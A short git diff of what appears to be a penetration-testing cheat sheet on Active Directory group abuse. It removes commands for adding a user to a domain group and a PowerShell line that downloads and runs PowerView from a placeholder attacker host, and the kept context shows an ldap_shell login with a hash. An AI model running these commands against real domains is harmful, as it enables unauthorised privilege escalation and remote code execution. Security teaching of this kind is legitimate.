@@ -32,17 +32,7 @@ Ldap_shell -> `ldap_shell '<domain>/<user>:' -hashes fffffffffffffffffffffffffff
 
 ### From Windows (internally):
 
-`net group <group> <user> /add /domain`
 
-Additionally can be done with Active directory module (powershell module):
-
-`Add-ADGroupMember -Identity '<group>' -Members '<user>'`
-
-Also is possible with powerview module:
-
-Load module -> `IEX (new-object net.webclient).downloadstring('http://your_evil_ip_or_domain/powerview.ps1')`
-
-`Add-DomainGroupMember -Identity '<group>' -Members '<user>'`
 
 
 
